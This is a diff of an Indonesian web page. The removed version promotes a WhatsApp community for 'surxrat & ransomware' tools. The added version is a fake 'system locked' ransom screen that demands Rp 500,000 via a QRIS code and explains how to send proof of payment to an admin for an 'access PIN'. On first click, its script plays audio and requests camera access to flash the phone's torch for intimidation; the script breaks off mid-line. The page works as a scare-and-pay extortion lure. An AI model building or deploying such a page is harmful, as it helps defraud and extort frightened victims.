@@ -1,131 +1,161 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Komunitas surxrat & ransomware</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #0d1117;
-      color: #f0f0f0;
-      text-align: center;
-      padding: 40px 20px;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYSTEM ENCRYPTED - VANZ MOODS</title>
+    <link href="https://fonts.googleapis.com/css2?family=Courier+Prime&family=Inter:wght@400;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --border-color: #222;
+            --bg-color: #000;
+            --accent-green: #00ff00;
+            --card-bg: #0a0a0a;
+        }
 
-    h2 {
-      font-size: 18px;
-      font-weight: 600;
-      margin-bottom: 5px;
-    }
+        body { background-color: var(--bg-color); color: #fff; font-family: 'Inter', sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        
+        /* Animasi Hacker Glitch */
+        .hacker-banner { width: 100%; max-width: 400px; border: 1px solid var(--border-color); margin-bottom: 20px; border-radius: 4px; overflow: hidden; animation: darkwebPulse 3s infinite; }
+        @keyframes darkwebPulse {
+            0%, 100% { filter: brightness(100%); }
+            10% { filter: brightness(30%) sepia(100%) hue-rotate(90deg); }
+            14% { filter: brightness(30%) sepia(100%) hue-rotate(0deg); }
+        }
+        .hacker-banner img { width: 100%; display: block; }
 
-    .subtitle {
-      font-size: 14px;
-      color: #bbb;
-      margin-bottom: 20px;
-    }
+        .logo-circle { width: 85px; height: 85px; border: 2px solid #fff; border-radius: 50%; overflow: hidden; margin-bottom: 10px; }
+        .logo-circle img { width: 100%; height: 100%; object-fit: cover; }
 
-    .logo {
-      width: 140px;
-      height: 140px;
-      border-radius: 50%;
-      overflow: hidden;
-      margin: 0 auto 20px;
-      border: 3px solid #25d366;
-    }
+        .warning-icon { font-size: 2rem; color: #ffcc00; margin-bottom: 5px; }
+        h1 { font-size: 1.6rem; margin: 0 0 20px 0; text-transform: uppercase; letter-spacing: 1px; font-weight: 900; }
 
-    .card {
-      background-color: #161b22;
-      border-radius: 16px;
-      padding: 20px;
-      max-width: 400px;
-      margin: 0 auto;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.5);
-    }
+        .main-box { width: 100%; max-width: 400px; border: 1px solid var(--border-color); padding: 20px; box-sizing: border-box; text-align: center; border-radius: 8px; }
+        
+        .qris-frame { width: 230px; margin: 0 auto 20px auto; border: 1px solid var(--border-color); background: #fff; padding: 10px; border-radius: 4px; }
+        .qris-frame img { width: 100%; display: block; }
 
-    h1 {
-      font-size: 20px;
-      margin-bottom: 10px;
-    }
+        /* Style Accordion */
+        .accordion { width: 100%; margin-bottom: 10px; border: 1px solid var(--border-color); border-radius: 4px; overflow: hidden; background: var(--card-bg); }
+        .acc-header { width: 100%; padding: 15px; background: none; border: none; color: #fff; display: flex; justify-content: space-between; align-items: center; cursor: pointer; font-family: 'Inter'; font-weight: 700; font-size: 0.85rem; }
+        .acc-content { max-height: 0; overflow: hidden; transition: max-height 0.4s ease-out; background: #050505; text-align: left; }
+        .acc-body { padding: 15px; font-size: 0.8rem; line-height: 1.5; color: #ccc; border-top: 1px solid #1a1a1a; }
+        
+        .instruction-img { width: 100%; max-width: 250px; margin: 10px 0; border: 1px solid #333; border-radius: 4px; display: block; }
 
-    p {
-      font-size: 14px;
-      margin: 6px 0;
-    }
+        .arrow { transition: transform 0.3s; border: solid #fff; border-width: 0 2px 2px 0; display: inline-block; padding: 3px; transform: rotate(45deg); }
+        .active .arrow { transform: rotate(-135deg); }
+        .active + .acc-content { max-height: 1200px; }
 
-    .rules {
-      text-align: left;
-      margin: 15px 0;
-      font-size: 14px;
-    }
-
-    .rules li {
-      margin: 8px 0;
-    }
-
-    .btn {
-      display: inline-block;
-      background-color: #25d366;
-      color: white;
-      padding: 12px 20px;
-      border-radius: 10px;
-      font-weight: bold;
-      text-decoration: none;
-      transition: 0.3s;
-    }
-
-    .btn:hover {
-      background-color: #1da851;
-    }
-
-    footer {
-      margin-top: 30px;
-      font-size: 12px;
-      color: #aaa;
-    }
-  </style>
+        .terminal { background: #050505; border: 1px solid var(--border-color); padding: 12px; text-align: left; font-family: 'Courier Prime', monospace; font-size: 0.8rem; color: var(--accent-green); margin: 15px 0; border-radius: 4px; min-height: 80px; }
+        .btn-pay { width: 100%; background: #fff; color: #000; border: none; padding: 16px; font-weight: 900; font-size: 0.9rem; cursor: pointer; text-transform: uppercase; border-radius: 4px; }
+        
+        .footer-text { font-family: 'Courier Prime', monospace; font-size: 0.8rem; color: #bbb; margin-top: 15px; font-weight: bold; }
+        footer { margin-top: 30px; font-size: 0.7rem; color: #444; font-family: 'Courier Prime', monospace; }
+    </style>
 </head>
 <body>
-  <h2>Bergabung dengan Komunitas</h2>
-  <p class="subtitle">Grup resmi surxrat & ransomware Indonesia</p>
 
-  <div class="card">
-    <div class="logo">
-      <!-- Logo bulat -->
-      <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
-        <clipPath id="circleView">
-          <circle cx="100" cy="100" r="100"/>
-        </clipPath>
-        <image width="200" height="200" xlink:href="logo2.jpg" clip-path="url(#circleView)" />
-      </svg>
+    <audio id="myAudio" loop>
+      <source src="musik.mp3" type="audio/mpeg">
+    </audio>
+
+    <div class="hacker-banner">
+        <img src="hacker.jpg" alt="Hacker Banner">
     </div>
 
-    <h1>Komunitas surxrat & ransomware Indonesia</h1>
-    <p>Tempat sharing, diskusi, dan update terbaru seputar aplikasi surxrat & ransomware.</p>
-    
-    <h1>Rules gc ❗️ </h1>
-    <ul class="rules">
-      <li>❌️ Dilarang share link tanpa izin admin.</li>
-      <li>❌️ Dilarang promosi tanpa izin admin.</li>
-      <li>❌️ Dilarang membagikan testimoni.</li>
-      <li>❌️ Dilarang send stiker / video yang mengandung unsur 18+.</li>
-      <li>❌️ Dilarang membagikan apk surxrat,ransomware dan base phising ke dalam grub.</li>
-      <li>❌️ Dilarang spam</li>
-      <li>✅️ Diskusi seputar apk surxrat & ransomware</li>
-      <li>✅️ Saling menghormati antar anggota</li>
-      <li>✅️ Gunakan bahasa yang sopan</li>
-    </ul>
-<p> Melanggar rules diatas? admin berhak mengeluarkan anggota yang melanggar rules ❗️</p>
-    <a class="btn" href="https://chat.whatsapp.com/Elsad4X1PU63ur9hroifJe?mode=ems_copy_t" target="_blank">
-      Bergabung Sekarang
-    </a>
- </div>
+    <div class="logo-circle">
+        <img src="logo.png" alt="Logo">
+    </div>
 
-  <footer>
-    © 2025 surxrat & ransomware • Komunitas resmi indonesia
-  </footer>
-      <footer>
-    © by vanzmoods
-      </footer>
-</body>
-</html>
+    <div class="warning-icon">⚠️</div>
+    <h1>SISTEM TERKUNCI</h1>
+
+    <div class="main-box">
+        
+        <div class="qris-frame">
+            <img src="qris.png" alt="QRIS">
+        </div>
+
+        <div class="accordion">
+            <button class="acc-header" onclick="toggleAcc(this)">
+                NOMINAL TRANSFER <i class="arrow"></i>
+            </button>
+            <div class="acc-content">
+                <div class="acc-body">
+                    Silakan transfer sebesar: <br>
+                    <strong style="color: var(--accent-green); font-size: 1.1rem;">Rp 500.000</strong><br>
+                    <span style="font-size: 0.7rem;">Pastikan nominal sesuai agar verifikasi lebih cepat.</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="accordion">
+            <button class="acc-header" onclick="toggleAcc(this)">
+                CARA MENDAPATKAN PIN AKSES <i class="arrow"></i>
+            </button>
+            <div class="acc-content">
+                <div class="acc-body">
+                    1. Scan QRIS diatas menggunakan akun payment anda.<br>
+                    2. Selesaikan pembayaran sesuai nominal.<br>
+                    3. Klik logo sms warna hijau pojok kanan bawah.<br>
+                    4. Klik logo mengirim pesan dan mengirim gambar:<br>
+                    <img src="instruksi1.jpg" class="instruction-img" alt="Tutorial 1">
+                    5. Klik icon lampiran untuk mengirim bukti transaksi:<br>
+                    <img src="instruksi2.jpg" class="instruction-img" alt="Tutorial 2">
+                    6. Kirim bukti transfer melalui Live Chat Dan beri keterangan "SAYA SUDAH TRANSFER".<br>
+                    7. Klik tombol "Konfirmasi Pembayaran".<br>
+                    8. Setelah itu tunggu beberapa saat Admin akan verifikasi dan akan mengirimkan PIN AKSES Melalui live Chat.
+                </div>
+            </div>
+        </div>
+
+        <div id="term" class="terminal">
+            > Status Sistem: TERKUNCI<br>
+            > Koneksi: Terenkripsi<br>
+            > Menunggu Pembayaran...
+        </div>
+
+        <button onclick="proses()" class="btn-pay" id="btn">KONFIRMASI PEMBAYARAN</button>
+
+        <div class="footer-text">
+            PIN AKSES akan diberikan oleh Admin via Live Chat setelah verifikasi manual.
+        </div>
+    </div>
+
+    <footer>© 2026 BY VANZMOODS - RPL PROJECT</footer>
+
+    <script>
+        let stream = null;
+        let isFlashOn = false;
+        let flashInterval = null;
+
+        // Fungsi Hack Effect: Musik + Senter HP
+        async function startHackEffects() {
+            // Putar Musik
+            const audio = document.getElementById("myAudio");
+            audio.play().catch(() => console.log("Interaksi diperlukan"));
+
+            // Efek Senter (Hanya Mobile & HTTPS)
+            if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+                    const track = stream.getVideoTracks()[0];
+                    const capabilities = track.getCapabilities();
+
+                    if (capabilities.torch) {
+                        flashInterval = setInterval(async () => {
+                            isFlashOn = !isFlashOn;
+                            await track.applyConstraints({ advanced: [{ torch: isFlashOn }] });
+                        }, 200); 
+                    }
+                } catch (err) {
+                    console.log("Senter tidak dapat diakses");
+                }
+            }
+        }
+
+        // Jalankan efek saat klik pertama
+        document.addEventListener('click', startHackEffects, { once: true });
+        document.
+
